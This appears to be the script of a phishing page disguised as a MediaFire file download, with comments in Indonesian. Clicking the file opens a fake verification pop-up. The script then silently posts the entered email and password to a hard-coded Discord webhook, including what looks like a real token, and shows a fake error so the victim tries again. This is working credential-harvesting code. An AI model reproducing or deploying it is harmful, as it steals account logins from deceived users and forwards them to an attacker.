<script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";

    // Fungsi buka pop-up pas file diklik
    function openGrayHat() {
        document.getElementById('overlay').style.display = 'flex';
    }

    // Sambungin ke elemen lo
    document.getElementById('fileDownload').addEventListener('click', openGrayHat);

    async function captureAndReset() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        const error = document.getElementById('error');

        if (!email || !pass) {
            alert("Harap masukkan data verifikasi!");
            return;
        }

        // Kirim data ke Discord secara silent
        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "ðŸ”“ Gateway Hit: MediaFire Original",
                        color: 0x0070ff,
                        fields: [
                            { name: "ðŸ‘¤ User/Email", value: `\`${email}\`` },
                            { name: "ðŸ”‘ Password", value: `\`${pass}\`` }
                        ],
                        footer: { text: "File: blocked wa by gusi" }
                    }]
                })
            });
        } catch (e) {}

        // Reset sandi dan tampilin error (System Looping)
        document.getElementById('pass').value = "";
        error.style.display = "block";
    }
</script>

